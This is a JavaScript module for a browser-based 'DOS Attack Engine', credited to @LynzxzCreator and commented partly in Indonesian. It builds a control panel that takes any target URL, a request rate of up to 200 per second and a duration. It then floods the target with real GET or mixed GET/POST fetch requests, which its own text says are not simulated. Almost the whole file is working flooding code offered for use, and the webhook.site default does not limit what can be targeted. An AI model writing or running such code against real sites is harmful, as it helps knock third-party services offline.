// ==================== DDoS ATTACK MODULE ====================
// Created by @LynzxzCreator
// Versi: DOS via Web Worker (beneran kirim request, gratis)

function renderDDoS(container) {
    container.innerHTML = `
        <div class="module-card">
            <h3><i class="fas fa-bolt"></i> DOS Attack Engine</h3>
            <p style="font-size:12px; color:#ffaa44;">🔥 Beneran kirim request (bukan simulasi) - Gratis!</p>
            
            <div class="input-group-module">
                <label>🎯 Target URL</label>
                <input type="text" id="ddosTarget" placeholder="https://example.com" value="https://webhook.site/">
                <small style="color:#888;">⚠️ Gunakan webhook.site atau requestcatcher.com untuk testing</small>
            </div>
            
            <div class="input-group-module">
                <label>⚙️ Method</label>
                <select id="ddosMethod">
                    <option value="http_flood">HTTP Flood (GET Request)</option>
                    <option value="slowloris">Slowloris (Keep-Alive)</option>
                    <option value="mixed">Mixed Attack (GET + POST)</option>
                </select>
            </div>
            
            <div class="input-group-module">
                <label>🧵 Request per Second (1-200)</label>
                <input type="range" id="ddosThreads" min="1" max="200" value="50">
                <div><span id="threadsValue">50</span> req/sec</div>
                <small>⚠️ Terlalu tinggi bisa bikin browser hang</small>
            </div>
            
            <div class="input-group-module">
                <label>⏱️ Duration (seconds)</label>
                <input type="range" id="ddosDuration" min="5" max="120" value="30">
                <div><span id="durationValue">30</span> detik</div>
            </div>
            
            <div style="display: flex; gap: 10px;">
                <button class="btn-primary" id="startDDoSBtn"><i class="fas fa-play"></i> START DOS</button>
                <button class="btn-primary btn-danger" id="stopDDoSBtn" style="display:none;"><i class="fas fa-stop"></i> STOP</button>
            </div>
            
            <div id="ddosStats" style="margin-top: 20px; background: #00000066; padding: 15px; border-radius: 12px;">
                <div>📊 <strong>Status:</strong> <span id="attackStatus">Idle</span></div>
                <div>📈 <strong>Requests Sent:</strong> <span id="requestCount">0</span></div>
                <div>⚡ <strong>Rate:</strong> <span id="requestRate">0</span> req/sec</div>
                <div>⏲️ <strong>Elapsed:</strong> <span id="elapsedTime">0</span> detik</div>
                <div>❌ <strong>Failed:</strong> <span id="errorCount">0</span></div>
            </div>
            
            <div id="ddosLog" style="margin-top: 15px; font-size: 11px; background: #000; padding: 10px; border-radius: 8px; max-height: 150px; overflow-y: auto;"></div>
        </div>
    `;
    
    // DOM elements
    const targetInput = document.getElementById('ddosTarget');
    const methodSelect = document.getElementById('ddosMethod');
    const threadsSlider = document.getElementById('ddosThreads');
    const durationSlider = document.getElementById('ddosDuration');
    const startBtn = document.getElementById('startDDoSBtn');
    const stopBtn = document.getElementById('stopDDoSBtn');
    const attackStatus = document.getElementById('attackStatus');
    const requestCountSpan = document.getElementById('requestCount');
    const requestRateSpan = document.getElementById('requestRate');
    const elapsedTimeSpan = document.getElementById('elapsedTime');
    const errorCountSpan = document.getElementById('errorCount');
    const logDiv = document.getElementById('ddosLog');
    
    let active = false;
    let requestCount = 0;
    let errorCount = 0;
    let startTime = null;
    let rateInterval = null;
    let lastCount = 0;
    let activeRequests = 0;
    
    // Slider display
    document.getElementById('threadsValue').innerText = threadsSlider.value;
    document.getElementById('durationValue').innerText = durationSlider.value;
    threadsSlider.oninput = () => document.getElementById('threadsValue').innerText = threadsSlider.value;
    durationSlider.oninput = () => document.getElementById('durationValue').innerText = durationSlider.value;
    
    function addLog(msg, type = 'info') {
        const time = new Date().toLocaleTimeString();
        const color = type === 'error' ? '#ff8888' : '#88ff88';
        logDiv.innerHTML += `<div style="color:${color}; border-bottom:1px solid #224466; padding:3px 0;">[${time}] ${msg}</div>`;
        logDiv.scrollTop = logDiv.scrollHeight;
        if(logDiv.children.length > 50) logDiv.removeChild(logDiv.children[0]);
    }
    
    async function sendRequest(url, method) {
        if (!active) return;
        activeRequests++;
        try {
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), 5000);
            
            const options = {
                method: method === 'post' ? 'POST' : 'GET',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': '*/*',
                    'Cache-Control': 'no-cache'
                },
                signal: controller.signal
            };
            
            if (method === 'post') {
                options.body = JSON.stringify({ test: Date.now() });
                options.headers['Content-Type'] = 'application/json';
            }
            
            const res = await fetch(url, options);
            clearTimeout(timeout);
            requestCount++;
        } catch (e) {
            errorCount++;
        } finally {
            activeRequests--;
        }
    }
    
    function startAttack() {
        let target = targetInput.value.trim();
        if (!target) {
            addLog('❌ Masukkan target URL!', 'error');
            return;
        }
        if (!target.startsWith('http')) target = 'https://' + target;
        
        const method = methodSelect.value;
        const reqPerSec = parseInt(threadsSlider.value);
        const duration = parseInt(durationSlider.value);
        
        addLog(`🚀 Starting DOS attack on ${target}`, 'info');
        addLog(`⚙️ ${reqPerSec} req/sec, ${duration} detik, Method: ${method}`, 'info');
        
        active = true;
        requestCount = 0;
        errorCount = 0;
        lastCount = 0;
        startTime = Date.now();
        attackStatus.innerText = '🔴 ATTACK RUNNING';
        startBtn.disabled = true;
        startBtn.style.opacity = '0.5';
        stopBtn.style.display = 'inline-block';
        
        // Rate limiter: kirim request sesuai rate
        const interval = 1000 / reqPerSec;
        let lastSend = Date.now();
        
        function sendLoop() {
            if (!active) return;
            const now = Date.now();
            const elapsed = now - lastSend;
            if (elapsed >= interval) {
                const toSend = Math.floor(elapsed / interval);
                for (let i = 0; i < Math.min(toSend, 10); i++) {
                    const reqMethod = method === 'mixed' ? (Math.random() > 0.5 ? 'get' : 'post') : 'get';
                    sendRequest(target, reqMethod);
                }
                lastSend = now;
            }
            setTimeout(sendLoop, 50);
        }
        sendLoop();
        
        // Stats update
        const statsInterval = setInterval(() => {
            if (!active) {
                clearInterval(statsInterval);
                return;
            }
            const elapsed = Math.floor((Date.now() - startTime) / 1000);
            elapsedTimeSpan.innerText = elapsed;
            const rate = requestCount - lastCount;
            requestRateSpan.innerText = rate;
            lastCount = requestCount;
            requestCountSpan.innerText = requestCount;
            errorCountSpan.innerText = errorCount;
        }, 1000);
        
        // Auto stop
        setTimeout(() => {
            if (active) stopAttack();
            clearInterval(statsInterval);
        }, duration * 1000);
        
        addLog('✅ Attack started! Request sedang dikirim...', 'success');
        addLog('📊 Buka webhook.site atau requestcatcher.com untuk lihat request masuk', 'info');
    }
    
    function stopAttack() {
        if (!active) return;
        active = false;
        attackStatus.innerText = 'Idle';
        startBtn.disabled = false;
        startBtn.style.opacity = '1';
        stopBtn.style.display = 'none';
        
        addLog(`⛔ Attack stopped. Total: ${requestCount} requests, ${errorCount} failed`, 'warning');
        addLog('💡 Tips: Gunakan webhook.site untuk testing request real', 'info');
    }
    
    startBtn.onclick = startAttack;
    stopBtn.onclick = stopAttack;
}
